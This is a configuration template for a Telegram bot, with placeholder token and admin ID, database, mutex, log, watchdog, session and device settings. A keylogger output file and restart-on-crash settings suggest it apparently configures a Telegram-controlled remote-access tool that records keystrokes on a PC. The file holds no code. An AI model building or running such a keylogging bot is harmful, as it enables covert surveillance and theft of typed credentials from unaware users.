# Telegram Bot Configuration
BOT_TOKEN=your_bot_token_here

# Super Administrator Configuration
SUPER_ADMIN_ID=your_telegram_id_here

# Database Configuration
DB_FILE=bot_database.db

# Mutex Configuration
MUTEX_NAME=KUSMAN_MAIN_BOT_MUTEX

# Logging Configuration
LOG_FILE=bot_runtime.log
WATCHDOG_LOG_FILE=watchdog_runtime.log

# Keylogger Configuration
KEYLOG_FILE=keylog.txt

# Watchdog Configuration
WATCHDOG_POLL_INTERVAL=5
CRASH_LOOP_DELAY=15
MAX_RESTART_ATTEMPTS=3

# Session Configuration
SESSION_TIMEOUT=3600

# Device Configuration
DEFAULT_DEVICE_NAME=UnknownPC
